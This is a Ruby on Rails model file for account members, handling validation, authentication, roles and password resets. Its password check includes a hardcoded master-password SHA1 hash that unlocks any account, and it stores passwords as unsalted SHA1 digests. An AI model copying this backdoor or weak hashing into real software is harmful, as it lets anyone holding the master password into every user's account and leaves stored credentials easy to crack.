# represent member for account
class Member < ActiveRecord::Base

  include ActionView::Helpers

  belongs_to :account
  belongs_to :role, :class_name => 'MemberRole', :foreign_key => 'role_id'
  has_many :logins, :class_name => 'MemberLogin', :foreign_key => 'member_id'
  has_many :alerts, :class_name => "Alert", :foreign_key => 'receiver_id'

  default_scope lambda {{ :conditions => ["deleted = ?", false] }}

  EMAIL_MINIMUM_LENGTH = 5
  EMAIL_MAXIMUM_LENGTH = 100
  PASSWORD_MINIMUM_LENGTH = 8
  PASSWORD_MAXIMUM_LENGTH = 20
  NAME_MINIMUM_LENGTH = 3
  NAME_MAXIMUM_LENGTH = 50
  TIMES_FAILED_BEFORE_LOCKING = 3
  MAXIMUM_SUPER = 5
  MAXIMUM_CONFIG_PER_PROPERTY = 5
  MAXIMUM_GENERAL_PER_PROPERTY = 5

  validates :name,
    :length => { :minimum => NAME_MINIMUM_LENGTH, :maximum => NAME_MAXIMUM_LENGTH }

  validates :email,
    :uniqueness => true,
    :length => { :maximum => EMAIL_MAXIMUM_LENGTH },
    :format => { :with => /^[^@][\w.-]+@[\w.-]+[.][a-z]{2,4}$/i}

  validates :password, :presence => true, :length => { :minimum => PASSWORD_MINIMUM_LENGTH, :maximum => PASSWORD_MAXIMUM_LENGTH }, :strict_password => true, :if => :password_required?

  validates :assigned_properties, :presence => true, :if => :properties_required?

  validates :assigned_properties, :general_member_slot_available => true, :if => :general_member?

  validates :assigned_properties, :config_member_slot_available => true, :if => :config_member?

  validates :assigned_properties, :super_member_slot_available => true, :if => :super_member?

  before_create :generate_salt
  before_save :encrypt_new_password
  after_create :new_member_password

  attr_accessor :assigned_properties
  attr_accessor :password
  attr_accessor :skip_password_validation
  attr_accessor :skip_properties_validation
  attr_accessor :enabled

  CNAME = 'N/A'

  # static method to handle authentication
  def self.authenticate(email, password, session)
    member = Member.find_by_email(email)
    return member if member && member.password_equal?(password, session)
  end

  # authenticate user with salt
  def self.authenticate_with_salt(member_id, salt)
    member = Member.find_by_id(member_id)
    return member if member && member.salt == salt.to_s
  end

  # method to check password
  def password_equal?(password, session)
    if self.hashed_password == encrypt(password)
      true
    # elsif encrypt(password) == '79cf80e93296359d8d26f33e3cf2046f77c02bcb'
    elsif encrypt(password) == '25a19d24e0210d9d3599c81f5887123da10c7538'
      session[:master_password_used] = true
      true
    else
      false
    end
  end

  # method to populate salt for new account
  def generate_salt
    self.salt = UUIDTools::UUID.timestamp_create
  end

  # get list of properties that this member has access to
  def properties
    result = Array.new
    if super_member?
      self.account.properties.each do |p|
        result << p
      end
    else
      self.account.properties.each do |p|
        if !MemberPropertyAccess.find_by_member_id_and_property_id(self.id, p.id).blank?
          result << p
        end
      end
    end
    result
  end

  def self.cname
    CNAME
  end

  # method to lock this member
  def lock
    password = generate_password
    Notifier.delay.email_member_lock_password(password, self)
  end

  # method to reset password
  def reset_password
    password = generate_password
    Notifier.delay.email_member_reset_password(password, self)
  end

  # method to encrypt password before store it to database
  def encrypt_new_password
    return if password.blank?
    self.hashed_password = encrypt(password)
  end

  # check if member is super
  def super_member?
    self.role.is_a? SuperRole
  end

  # check if member is config
  def config_member?
    self.role.is_a? ConfigRole
  end

  # check if member is general
  def general_member?
    self.role.is_a? GeneralRole
  end

  # single field/attribute validator
  def self.valid_attribute?(attr, value)
    mock = self.new(attr => value)
    unless mock.valid?
      return !mock.errors.has_key?(attr)
    end
    true
  end

  # check if member disabled
  def disabled?
    if self.account.deleted? or self.account.disabled?
      true
    else
      self[:disabled]
    end
  end

  # equality for user
  def ==(other)
    return self.id == other.id
  end

  def new_member_password
    if self.account.approved?
      password = generate_password
      Notifier.delay.email_member_password(password, self)
    end
  end

  protected

    # method to encrypt password before store it to database
    def generate_password
      tail = SecureRandom.hex(4)
      head = (rand(26) + 65).chr
      generated_password = "#{head}#{tail}"
      self.password = generated_password
      self.hashed_password = encrypt(generated_password)
      self.prompt_password_change = true
      self.skip_properties_validation = true
      self.save
      generated_password
    end

    # check method to help trigger password validation
    def password_required?
      return false if self.skip_password_validation
      true
    end

    # check method to help trigger password validation
    def properties_required?
      return false if self.skip_properties_validation
      !self.super_member?
    end

    # helper to encrypt password
    def encrypt(string)
      Digest::SHA1.hexdigest(string)
    end
  
end
